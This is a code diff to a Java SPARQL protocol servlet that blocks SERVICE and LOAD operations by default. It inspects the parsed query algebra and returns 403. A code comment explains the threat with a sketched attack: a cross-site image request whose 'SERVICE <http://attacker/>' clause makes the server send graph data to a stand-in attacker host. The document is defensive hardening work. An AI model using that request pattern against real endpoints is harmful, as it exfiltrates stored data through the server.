@@ -22,6 +22,10 @@ import org.eclipse.rdf4j.query.TupleQuery;
 import org.eclipse.rdf4j.query.TupleQueryResult;
 import org.eclipse.rdf4j.query.Update;
 import org.eclipse.rdf4j.query.impl.SimpleDataset;
+import org.eclipse.rdf4j.query.algebra.Load;
+import org.eclipse.rdf4j.query.algebra.QueryModelNode;
+import org.eclipse.rdf4j.query.algebra.Service;
+import org.eclipse.rdf4j.query.algebra.helpers.AbstractQueryModelVisitor;
 import org.eclipse.rdf4j.query.parser.ParsedUpdate;
 import org.eclipse.rdf4j.query.parser.QueryParserUtil;
 import org.eclipse.rdf4j.query.resultio.BooleanQueryResultFormat;
@@ -90,7 +94,7 @@ import java.util.function.Supplier;
  * </pre>
  * The base IRI for relative IRIs (§2.3) is the request URL. Status codes: 400 malformed query,
  * bad graph IRI, or update dataset parameters together with USING / WITH (§2.2.3); 403 update
- * while disabled; 405 update via GET; 406 no acceptable result format; 413 body over the limit;
+ * while disabled, or SERVICE / LOAD while federation is disabled ({@link #reachesOut}); 405 update via GET; 406 no acceptable result format; 413 body over the limit;
  * 415 unknown POST content type or charset; 500 evaluation failure; 503 execution time exceeded
  * or every query slot busy (then with {@code Retry-After}). A failure after the response is
  * committed — the execution limit tripping mid-stream — aborts the response instead.
@@ -229,6 +233,11 @@ public final class SparqlProtocolServlet extends HttpServlet {
                 fail(resp, HttpServletResponse.SC_BAD_REQUEST, "malformed query: " + e.getMessage());
                 return;
             }
+            if (!options.federationEnabled()
+                    && reachesOut(QueryParserUtil.parseQuery(QueryLanguage.SPARQL, queryString, baseIri(req)).getTupleExpr())) {
+                federationDisabled(resp);
+                return;
+            }
             Dataset dataset = dataset(params, "default-graph-uri", "named-graph-uri");
             if (dataset != null) {
                 query.setDataset(dataset);
@@ -359,7 +368,12 @@ public final class SparqlProtocolServlet extends HttpServlet {
             Dataset dataset = dataset(params, "using-graph-uri", "using-named-graph-uri");
             Update update;
             try {
-                if (dataset != null && namesItsOwnDataset(updateString, base)) {
+                ParsedUpdate parsed = QueryParserUtil.parseUpdate(QueryLanguage.SPARQL, updateString, base);
+                if (!options.federationEnabled() && parsed.getUpdateExprs().stream().anyMatch(SparqlProtocolServlet::reachesOut)) {
+                    federationDisabled(resp);
+                    return;
+                }
+                if (dataset != null && namesItsOwnDataset(parsed)) {
                     // §2.2.3: protocol dataset parameters together with USING, USING NAMED or
                     // WITH in the request are an error. Executing anyway is not harmless —
                     // RDF4J lets WITH win, so the update silently rewrites a different graph
@@ -421,9 +435,41 @@ public final class SparqlProtocolServlet extends HttpServlet {
      * becomes {@code DELETE FROM / INSERT INTO / FROM <g>}, {@code USING <g>} becomes
      * {@code FROM <g>}); operations without them map to {@code null}.
      */
-    private static boolean namesItsOwnDataset(String updateString, String base) {
-        ParsedUpdate parsed = QueryParserUtil.parseUpdate(QueryLanguage.SPARQL, updateString, base);
+    private static boolean namesItsOwnDataset(ParsedUpdate parsed) {
         return parsed.getDatasetMapping().values().stream().anyMatch(Objects::nonNull);
+    }
+
+    /**
+     * Whether evaluating {@code node} would make this server send a request of its own:
+     * {@code SERVICE} anywhere in a query or an update's {@code WHERE}, or {@code LOAD}.
+     *
+     * <p>Why this is refused by default rather than left to the origin filter: a cross-site
+     * {@code <img src="http://127.0.0.1:8089/sparql?query=…">} is a GET that carries no
+     * {@code Origin} header, and with {@code SERVICE <http://attacker/>} in it the server
+     * itself posts bindings from the graph to the attacker — found reviewing #105, where the
+     * remote service received the seeded drivers' names in a {@code VALUES} clause. CORS
+     * cannot help; the data never passes through the browser. The engine owns the repository,
+     * so its service resolver cannot be swapped out here; the parsed algebra is checked instead.
+     */
+    static boolean reachesOut(QueryModelNode node) {
+        boolean[] found = {false};
+        node.visit(new AbstractQueryModelVisitor<RuntimeException>() {
+            @Override
+            public void meet(Service service) {
+                found[0] = true;
+            }
+
+            @Override
+            public void meet(Load load) {
+                found[0] = true;
+            }
+        });
+        return found[0];
+    }
+
+    private static void federationDisabled(HttpServletResponse resp) throws IOException {
+        fail(resp, HttpServletResponse.SC_FORBIDDEN, "SERVICE and LOAD are disabled on this endpoint: they make the "
+                + "server send requests of its own (CQELS_SPARQL_FEDERATION_ENABLED=true enables them)");
     }
 
     // ---- helpers -----------------------------------------------------------------------
